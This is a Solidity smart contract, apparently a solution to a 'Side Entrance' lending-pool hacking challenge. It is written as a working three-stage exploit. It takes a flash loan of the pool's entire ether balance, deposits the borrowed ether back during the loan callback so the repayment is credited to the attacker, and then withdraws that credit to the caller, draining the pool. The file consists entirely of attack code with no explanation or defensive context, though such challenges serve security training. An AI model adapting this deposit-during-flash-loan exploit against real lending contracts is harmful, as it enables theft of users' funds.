// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract ExploitFlashLoanEtherReceiver {
    uint256 private s_poolBalance;
    address immutable i_pool;

    constructor(address pool) {
        i_pool = pool;
    }
    // Stage 0
    function flashLoan() external {
        s_poolBalance = address(i_pool).balance;
        ISideEntranceLenderPool(i_pool).flashLoan(s_poolBalance);
    }

    // Stage 1
    function execute() external payable { 
        ISideEntranceLenderPool(i_pool).deposit{value: s_poolBalance}();
    }

    // Stage 2
    function withdraw() external {
        ISideEntranceLenderPool(i_pool).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
